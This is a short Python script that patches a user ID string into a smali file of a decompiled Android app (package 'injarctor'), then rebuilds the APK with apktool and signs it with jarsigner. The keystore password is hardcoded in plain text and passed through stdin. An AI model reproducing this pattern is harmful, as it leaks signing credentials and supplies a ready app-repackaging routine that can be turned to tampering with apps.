import re
import os, sys
import subprocess


def compile_apk(root_path, userID, apk_name):
    data = ''
    apk_path = os.path.join(root_path, apk_name)
    smali = os.path.join(root_path, apk_name, "smali/com/injarctor/DeviceUtils.smali")
    apk = os.path.join(root_path, apk_name, "dist", apk_name+".apk")
    key = os.path.join(root_path, "debug.keystore")
    with open(smali, 'r+') as f:
        for line in f.readlines():
            if bool(re.search("const-string v1, \"\d+\"", line)):
                line = "    const-string v1, \"" + userID + "\"\n"
            data += line
    with open(smali, "w", encoding="utf-8") as f:
        f.write(data)
        print("injected over")
    subprocess.run(['apktool', 'b', apk_path])
    jarsigner = subprocess.Popen(['jarsigner', '-keystore', key, apk, 'release'], stdin=subprocess.PIPE,
                                 stdout=subprocess.PIPE)
    jarsigner.communicate(input='max1998'.encode())
    return os.path.join(apk_path, "dist")
    # jarsigner.expect('Enter Passphrase for keystore')
    # jarsigner.sendline("max1998")
    # os.system("apktool b %s" % root_path)
    # os.system("jarsigner -keystore %s %s release" % (key, apk))
